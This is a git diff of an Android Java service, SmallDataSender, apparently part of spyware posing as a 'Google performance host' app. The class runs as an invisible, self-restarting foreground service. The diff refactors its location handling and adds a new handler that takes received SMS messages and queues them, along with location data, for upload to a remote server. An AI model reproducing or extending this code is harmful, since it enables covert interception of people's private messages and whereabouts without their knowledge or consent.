@@ -1,13 +1,10 @@
 package com.example.tiber.googleperformancehost.Services.Daemons;
 
-import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.AsyncTask;
-import android.os.IBinder;
-import android.support.annotation.Nullable;
 import android.util.Log;
 
 import com.example.tiber.googleperformancehost.Classes.ServerConnection;
@@ -18,9 +15,9 @@ import com.example.tiber.googleperformancehost.SharedClasses.Communication.Reque
 import com.example.tiber.googleperformancehost.SharedClasses.Communication.ResponseEnum;
 import com.example.tiber.googleperformancehost.SharedClasses.Objects.LocationData;
 import com.example.tiber.googleperformancehost.SharedClasses.Objects.Sendable;
+import com.example.tiber.googleperformancehost.SharedClasses.Objects.ReceivedSmsData;
 import com.google.gson.Gson;
 
-import java.lang.reflect.Type;
 import java.util.concurrent.ConcurrentLinkedQueue;
 
 /**
@@ -56,35 +53,13 @@ public class SmallDataSender extends ForegroundInvisibleService {
             case "justStart"://just keeping alive...return
                 return START_STICKY;
             case "locationUpdate":
-                String locationDataJSon = intent.getStringExtra("locationData");
-                if(locationDataJSon != null) {
-                    LocationData location = new Gson().fromJson(locationDataJSon,LocationData.class);
-                    dataQueue.add(location);
-                    if(internetAccess(appContext)){
-                        if((worker == null || worker.getStatus() != AsyncTask.Status.RUNNING) &&
-                                dataQueue.size() != 0 ) {
-                            worker = new AsyncWorkerSender(appContext, dataQueue,
-                                    appContext.getResources().getInteger(R.integer.NUMBER_OF_CONNECTION_TRIES_SMALL_DATA_SENDER));
-                            worker.execute();
-                        }
-                    }
-                }
+                handleLocationUpdate(intent);
                 break;
             case "networkChange":
-                boolean internetAccess = intent.getBooleanExtra("internetAccess",false);
-                if(internetAccess){
-                    if( ( worker == null || ( worker != null && worker.getStatus() != AsyncTask.Status.RUNNING )) &&
-                            dataQueue.size() != 0 ) {
-                        worker = new AsyncWorkerSender(appContext, dataQueue,
-                                appContext.getResources().getInteger(R.integer.NUMBER_OF_CONNECTION_TRIES_SMALL_DATA_SENDER));
-                        worker.execute();
-                    }
-                }
-                else{
-                    if(worker != null && worker.getStatus() == AsyncTask.Status.RUNNING && !worker.isCancelled() ) {
-                        worker.cancel(true);
-                    }
-                }
+                handleNetworkChange(intent);
+                break;
+            case "receivedSMS":
+                handleReceivedSMS(intent);
                 break;
             default:
                 Log.wtf(debugTag,"defaulted switch statement in onStartCommand...."+"what is = "+what);
@@ -92,6 +67,52 @@ public class SmallDataSender extends ForegroundInvisibleService {
         }
         return START_STICKY;
     }
+
+    private void handleReceivedSMS(Intent intent) {
+        String smsJSon = intent.getStringExtra("smsJson");
+        if(smsJSon != null){
+            ReceivedSmsData sms = new Gson().fromJson(smsJSon,ReceivedSmsData.class);
+            dataQueue.add(sms);
+            startWorker();
+        }
+    }
+
+    private void handleNetworkChange(Intent intent) {
+        boolean internetAccess = intent.getBooleanExtra("internetAccess",false);
+        if(internetAccess){
+            if( ( worker == null || ( worker != null && worker.getStatus() != AsyncTask.Status.RUNNING )) &&
+                    dataQueue.size() != 0 ) {
+                worker = new AsyncWorkerSender(appContext, dataQueue,
+                        appContext.getResources().getInteger(R.integer.NUMBER_OF_CONNECTION_TRIES_SMALL_DATA_SENDER));
+                worker.execute();
+            }
+        }
+        else{
+            if(worker != null && worker.getStatus() == AsyncTask.Status.RUNNING && !worker.isCancelled() ) {
+                worker.cancel(true);
+            }
+        }
+    }
+
+    private void handleLocationUpdate(Intent intent) {
+        String locationDataJSon = intent.getStringExtra("locationData");
+        if(locationDataJSon != null) {
+            LocationData location = new Gson().fromJson(locationDataJSon,LocationData.class);
+            dataQueue.add(location);
+            startWorker();
+            }
+        }
+
+    private void startWorker() {
+        if(internetAccess(appContext)){
+            if((worker == null || worker.getStatus() != AsyncTask.Status.RUNNING) &&
+                    dataQueue.size() != 0 ) {
+                worker = new AsyncWorkerSender(appContext, dataQueue,
+                        appContext.getResources().getInteger(R.integer.NUMBER_OF_CONNECTION_TRIES_SMALL_DATA_SENDER));
+                worker.execute();
+            }
+    }
+}
 
     class AsyncWorkerSender extends AsyncTask<Void,Void,Void> {
 
